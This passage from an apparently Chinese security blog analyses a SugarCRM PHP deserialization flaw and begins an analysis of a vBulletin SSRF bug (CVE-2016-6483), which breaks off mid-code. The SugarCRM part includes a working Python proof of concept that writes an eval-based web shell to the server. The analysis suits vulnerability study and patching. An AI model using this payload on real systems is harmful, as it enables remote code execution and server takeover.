alt="1"></p><p>打开<code>v2v3v4</code>中的一个目录中的<code>rest.php</code>文件，发现这是不同版本rest的入口文件，主要提供了<code>sugarcrm</code>的<code>webserver</code>服务。</p><blockquote><p>这边说的是看目录结构的思路，其实比较简单的方法就是全局搜索<code>service/core/</code>，来查看哪些地方<code>require</code>了该文件，配合查看目录结构，非常的方便。</p></blockquote><p>在这里我们可以想到整个<code>service</code>目录就是提供网络服务的目录，跟一下<code>rest.php</code>中的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'../..'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'SugarWebServiceImplv4.php'</span>);</span><br><span class="line">$webservice_class = <span class="string">'SugarRestService'</span>;</span><br><span class="line">$webservice_path = <span class="string">'service/core/SugarRestService.php'</span>;</span><br><span class="line">$webservice_impl_class = <span class="string">'SugarWebServiceImplv4'</span>;</span><br><span class="line">$registry_class = <span class="string">'registry'</span>;</span><br><span class="line">$location = <span class="string">'/service/v4/rest.php'</span>;</span><br><span class="line">$registry_path = <span class="string">'service/v4/registry.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'service/core/webservice.php'</span>);</span><br></pre></td></tr></table></figure><p>前面都是一些变量的初始化，直接跟进<code>service/core/webservice.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ob_start();</span><br><span class="line">chdir(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../../'</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'include/entryPoint.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'soap/SoapError.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'SoapHelperWebService.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'SugarRestUtils.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>($webservice_path);</span><br><span class="line"><span class="keyword">require_once</span>($registry_path);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($webservice_impl_class_path))</span><br><span class="line">    <span class="keyword">require_once</span>($webservice_impl_class_path);</span><br><span class="line">$url = $GLOBALS[<span class="string">'sugar_config'</span>][<span class="string">'site_url'</span>].$location;</span><br><span class="line">$service = <span class="keyword">new</span> $webservice_class($url);</span><br><span class="line">$service-&gt;registerClass($registry_class);</span><br><span class="line">$service-&gt;register();</span><br><span class="line">$service-&gt;registerImplClass($webservice_impl_class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set the service object in the global scope so that any error, if happens, can be set on this object</span></span><br><span class="line"><span class="keyword">global</span> $service_object;</span><br><span class="line">$service_object = $service;</span><br><span class="line"></span><br><span class="line">$service-&gt;serve();</span><br></pre></td></tr></table></figure><p>根据前面的变量定义，这里我们可以明显的看出调用关系：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = ip地址/service/v4/rest.php</span><br><span class="line">$service = <span class="keyword">new</span> SugarRestService($url)</span><br></pre></td></tr></table></figure><p>跟进<code>service/core/SugarRestService.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'Begin: SugarRestService-&gt;__construct'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;restURL = $url;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;responseClass = <span class="keyword">$this</span>-&gt;_getTypeName(@$_REQUEST[<span class="string">'response_type'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;serverClass = <span class="keyword">$this</span>-&gt;_getTypeName(@$_REQUEST[<span class="string">'input_type'</span>]);</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'SugarRestService-&gt;__construct serverclass = '</span> . <span class="keyword">$this</span>-&gt;serverClass);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'service/core/REST/'</span>. <span class="keyword">$this</span>-&gt;serverClass . <span class="string">'.php'</span>);</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'End: SugarRestService-&gt;__construct'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下<code>_getTypeName</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_getTypeName</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($name)) <span class="keyword">return</span> <span class="string">'SugarRest'</span>;</span><br><span class="line"></span><br><span class="line">$name = clean_string($name, <span class="string">'ALPHANUM'</span>);</span><br><span class="line">$type = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">switch</span>(strtolower($name)) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'json'</span>:</span><br><span class="line">$type = <span class="string">'JSON'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'rss'</span>:</span><br><span class="line">$type = <span class="string">'RSS'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'serialize'</span>:</span><br><span class="line">$type = <span class="string">'Serialize'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">$classname = <span class="string">"SugarRest$type"</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">'service/core/REST/'</span> . $classname . <span class="string">'.php'</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'SugarRest'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $classname;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里可以通过构造<code>input_type = serialize</code>来使<code>$this-&gt;serverClass = SugarRestSerialize</code>，接下来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$service-&gt;registerClass($registry_class);</span><br><span class="line">$service-&gt;register();</span><br><span class="line">$service-&gt;registerImplClass($webservice_impl_class);</span><br></pre></td></tr></table></figure><p>将<code>SugarRestSerialize</code>类进行注册，在这三个函数调用的过程中在<code>registerImplClass</code>方法中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;server = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;serverClass(<span class="keyword">$this</span>-&gt;implementation);</span><br></pre></td></tr></table></figure><p>在最后调用<code>$service-&gt;serve();</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">serve</span><span class="params">()</span></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'Begin: SugarRestService-&gt;serve'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'service/core/REST/'</span>. <span class="keyword">$this</span>-&gt;responseClass . <span class="string">'.php'</span>);</span><br><span class="line">$response  = <span class="keyword">$this</span>-&gt;responseClass;</span><br><span class="line"></span><br><span class="line">$responseServer = <span class="keyword">new</span> $response(<span class="keyword">$this</span>-&gt;implementation);</span><br><span class="line"><span class="keyword">$this</span>-&gt;server-&gt;faultServer = $responseServer;</span><br><span class="line">$responseServer-&gt;faultServer = $responseServer;</span><br><span class="line">$responseServer-&gt;generateResponse(<span class="keyword">$this</span>-&gt;server-&gt;serve());</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'End: SugarRestService-&gt;serve'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>$responseServer-&gt;generateResponse($this-&gt;server-&gt;serve());</code>也就是调用了<code>SugarRestSerialize.php</code>中的<code>serve</code>方法，从而将我们构造好的序列化参数传递过去。</p><h2 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h2><p>从上面的分析中，我们已经知道了从哪里传入构造的序列化，传输过程。现在需要找的就是漏洞利用点，也就是漏洞触发点。</p><p>我们都知道现在只需要在序列化参数中传入需要反序列化的文件名，以及方法名，就可以将构造好的poc传递过去。</p><blockquote><p>关于找漏洞触发点，可以全局搜索危险函数名，以及通读代码来完成（耗费很多时间，并且没有一定的经验容易乱）。</p></blockquote><p>在<code>include/SugarCache/SugarCacheFile.php</code>找到漏洞利用点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">parent</span>::__destruct();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">$this</span>-&gt;_cacheChanged )</span><br><span class="line">        sugar_file_put_contents(sugar_cached(<span class="keyword">$this</span>-&gt;_cacheFileName), serialize(<span class="keyword">$this</span>-&gt;_localStore));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* This is needed to prevent unserialize vulnerability</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// clean all properties</span></span><br><span class="line">    <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"Not a serializable object"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在<code>__wakeup</code>魔术方法中，会将我们传递过来的数据清零，现在需要绕过该魔术方法，利用构造的序列化参数实现<code>__destrcut</code>中的写操作，绕过方法利用的就是<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">CVE-2016-7124</a>。</p><p>在来看一下<code>sugar_file_put_contents</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sugar_file_put_contents</span><span class="params">($filename, $data, $flags=null, $context=null)</span></span>&#123;  </span><br><span class="line">    <span class="comment">//check to see if the file exists, if not then use touch to create it.</span></span><br><span class="line">    <span class="keyword">if</span>(!file_exists($filename))&#123;</span><br><span class="line">        sugar_touch($filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !is_writable($filename) ) &#123;</span><br><span class="line">        $GLOBALS[<span class="string">'log'</span>]-&gt;error(<span class="string">"File $filename cannot be written to"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($flags)) &#123;</span><br><span class="line">        <span class="keyword">return</span> file_put_contents($filename, $data);</span><br><span class="line">    &#125; <span class="keyword">elseif</span>(<span class="keyword">empty</span>($context)) &#123;</span><br><span class="line">        <span class="keyword">return</span> file_put_contents($filename, $data, $flags);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_put_contents($filename, $data, $flags, $context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数并没有对文件内容或者扩展名等进行限制，虽然参数<code>$data</code>是serialize(<code>$this-&gt;_localStore</code>)，也就是序列化后的数据，但是我们可以设置<code>$_this-&gt;_localStore</code>为一个数组，把payload作为数组中的一个值，就可以完整保存payload。（反正就是执行一个写操作，php序列化数组后并不会对数组的值进行干扰）</p><p>所以，传入一个<code>SugarCacheFile</code>对象，并设置其属性的值，就能进行写文件操作。</p><p>demo的话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line"></span><br><span class="line">url = &apos;http://127.0.0.1:8788/service/v4/rest.php&apos;</span><br><span class="line"></span><br><span class="line">data = &#123;  </span><br><span class="line">    &apos;method&apos;: &apos;login&apos;,</span><br><span class="line">    &apos;input_type&apos;: &apos;Serialize&apos;,</span><br><span class="line">    &apos;rest_data&apos;: &apos;O:+14:&quot;SugarCacheFile&quot;:23:&#123;S:17:&quot;\\00*\\00_cacheFileName&quot;;s:15:&quot;../custom/shell.php&quot;;S:16:&quot;\\00*\\00_cacheChanged&quot;;b:1;S:14:&quot;\\00*\\00_localStore&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[\&apos;Lucifaer\&apos;]); ?&gt;&quot;;&#125;&#125;&apos;,</span><br><span class="line">&#125;</span><br><span class="line">req.post(url, data=data)</span><br></pre></td></tr></table></figure><p>shell在<code>custom/shell.php</code></p><p>恩，就是这样了。</p><h1 id="0x03-补丁diff"><a href="#0x03-补丁diff" class="headerlink" title="0x03 补丁diff"></a>0x03 补丁diff</h1><p>在v6.5.24中，对<code>sugar_unserialize</code>进行了如下改进：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sugar_unserialize</span><span class="params">($value)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    preg_match(<span class="string">'/[oc]:[^:]*\d+:/i'</span>, $value, $matches);</span><br><span class="line">    <span class="keyword">if</span> (count($matches)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> unserialize($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过了前面的分析，可以看到对象类型的序列化参数无法禁止反序列化了。</p><h1 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04 修复方案"></a>0x04 修复方案</h1><p>升级SugarCRM到最新版本</p><p>对于php版本的升级并不是很建议，因为在一些高版本的php上，环境搭建可能会出现问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;免费广告…..推荐使用&lt;code&gt;PHPSTORM+Xdebug&lt;/code&gt;来分析漏洞，下面的过程都是利用&lt;code&gt;PHPSTORM&lt;/code&gt;来分析的。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-6483 vBulletin 5.2.2 SSRF漏洞</title>
    <link href="https://lucifaer.com/2016/08/11/CVE-2016-6483%20vBulletin%205.2.2%20SSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>https://lucifaer.com/2016/08/11/CVE-2016-6483 vBulletin 5.2.2 SSRF漏洞/</id>
    <published>2016-08-11T10:28:00.000Z</published>
    <updated>2018-08-09T02:22:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-漏洞概述："><a href="#0x00-漏洞概述：" class="headerlink" title="0x00 漏洞概述："></a>0x00 漏洞概述：</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>vBulletin是一个商业论坛程序，它封装了自己的curl用于发出请求。近日研究人员发现在某些版本中其getlinkdata这项功能并没有对跳转进行检测和制止，从而导致SSRF漏洞的产生。</p><a id="more"></a><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>vBulletin  &lt;= 5.2.2      Preauth Server Side Request Forgery (SSRF)</p><p>vBulletin  &lt;= 4.2.3</p><p>vBulletin  &lt;= 3.8.9</p><h1 id="0x01-漏洞分析："><a href="#0x01-漏洞分析：" class="headerlink" title="0x01 漏洞分析："></a>0x01 漏洞分析：</h1><p>首先，在<code>/upload/include/vb5/frontend/controller/link.php</code>中定义了<code>actionGetlinkdata</code>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  $input = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'url'</span> =&gt; trim($_REQUEST[<span class="string">'url'</span>]),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$api = Api_InterfaceAbstract::instance();</span><br><span class="line"></span><br><span class="line">$video = $api-&gt;callApi(<span class="string">'content_video'</span>, <span class="string">'getVideoFromUrl'</span>, <span class="keyword">array</span>($input[<span class="string">'url'</span>]));</span><br><span class="line">$data = $api-&gt;callApi(<span class="string">'content_link'</span>, <span class="string">'parsePage'</span>, <span class="keyword">array</span>($input[<span class="string">'url'</span>]));</span><br></pre></td></tr></table></figure><p>获取输入的url参数，通过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$video = $api-&gt;callApi(<span class="string">'content_video'</span>, <span class="string">'getVideoFromUrl'</span>, <span class="keyword">array</span>($input[<span class="string">'url'</span>]));</span><br><span class="line">$data = $api-&gt;callApi(<span class="string">'content_link'</span>, <span class="string">'parsePage'</span>, <span class="keyword">array</span>($input[<span class="string">'url'</span>]));</span><br></pre></td></tr></table></figure><p>分别传递给<code>content_video</code>和<code>content_link</code>这两个controller中的<code>getVideoFromUrl</code>和<code>parsePage</code>这两个api函数。</p><p>在<code>/upload/core/vb/api/content/link.php</code>中的<code>parsePage</code>api函数中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parsePage</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Validate url</span></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'|^http(s)?://[a-z0-9-]+(\.[a-z0-9-]+)*(:[0-9]+)?(/.*)?$|i'</span>, $url))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> vB_Exception_Api(<span class="string">'upload_invalid_url'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (($urlparts = vB_String::parseUrl($url)) === <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> vB_Exception_Api(<span class="string">'upload_invalid_url'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Try to fetch the url</span></span><br><span class="line">$vurl = <span class="keyword">new</span> vB_vURL();</span><br><span class="line">$vurl-&gt;set_option(VURL_URL, $url);</span><br><span class="line"><span class="comment">// Use IE8's User-Agent for the best compatibility</span></span><br><span class="line">$vurl-&gt;set_option(VURL_USERAGENT, <span class="string">'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)'</span>);</span><br><span class="line">$vurl-&gt;set_option(VURL_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$vurl-&gt;set_option(VURL_CLOSECONNECTION, <span class="number">1</span>);</span><br><span class="line">$vurl-&gt;set_option(VURL_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">$vurl-&gt;set_option(VURL_HEADER, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$page = $vurl-&gt;exec();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;extractData($page, $urlparts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>完成对于url的获取,以及对于各个参数的设置。</li><li>传入的<code>$url</code>直接新建了一个对象<code>vB_vURL()</code>来实现<code>curl</code></li><li><code>$vurl-&gt;set_option(VURL_FOLLOWLOCATION, 1);</code>设置<code>VURL_FOLLOWLOCATION</code>参数值为1，允许跳转后的二次跳转</li></ul><p>在<code>/upload/core/vb/vurl.php</code>中的<code>class_vB_vURL()</code>触发漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $classnames = <span class="keyword">array</span>(<span class="string">'cURL'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;options = vB::getDatastore()-&gt;get_value(<span class="string">'options'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create the objects we need</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;classnames <span class="keyword">AS</span> $classname)</span><br><span class="line">&#123;</span><br><span class="line">$fullclass = <span class="string">'vB_vURL_'</span> . $classname;</span><br><span class="line"><span class="keyword">$this</span>-&gt;transports[<span class="string">"$classname"</span>] = <span class="keyword">new</span> $fullclass(<span class="keyword">$this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;reset();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  $result = <span class="keyword">$this</span>-&gt;exec2();</span><br><span class="line">  ......</span><br><span class="line">  <span class="keyword">return</span> $result;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exec2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        .......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (array_keys(<span class="keyword">$this</span>-&gt;transports) <span class="keyword">AS</span> $tname)</span><br><span class="line">    &#123;</span><br><span class="line">    $transport =&amp; <span class="keyword">$this</span>-&gt;transports[$tname];</span><br><span class="line">    <span class="keyword">if</span> (($result = $transport-&gt;exec()) === VURL_HANDLED  <span class="keyword">AND</span> !<span class="keyword">$this</span>-&gt;fetch_error())</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format_response(<span class="keyword">array</span>(<span class="string">'headers'</span> =&gt; $transport-&gt;response_header, <span class="string">'body'</span> =&gt; (<span class="keyword">isset</span>($transport-&gt;response_text)? $transport-&gt;response_text : <span class="string">""</span>), <span class="string">'body_file'</span> =&gt; <span class="keyword">$this</span>-&gt;tmpfile));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>首先，在调用该类时触发构造函数，创建我们需要的行的对象，处理拼接后的对象为：<code>vB_vURL_cURL()</code></li><li>之后，使用其中的<code>exec()</code>方法。</li></ul><p>在<code>/upload/core/vb/vurl/curl.php</code>中看到<code>vB_vURL_cURL()</code>类中的<code>exec()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $urlinfo = @vB_String::parseUrl(<span class="keyword">$this</span>-&gt;vurl-&gt;options[VURL_URL]);</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;validateUrl($urlinfo))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> VURL_NEXT;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ......</span><br><span class="line"></span><br><span class="line">  $url = <span class="keyword">$this</span>-&gt;vurl-&gt;options[VURL_URL];</span><br><span class="line"></span><br><span class="line">  $redirectCodes = <span class="keyword">array</span>(<span class="number">301</span>, <span class="number">302</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ($i = $redirect_tries; $i &gt; <span 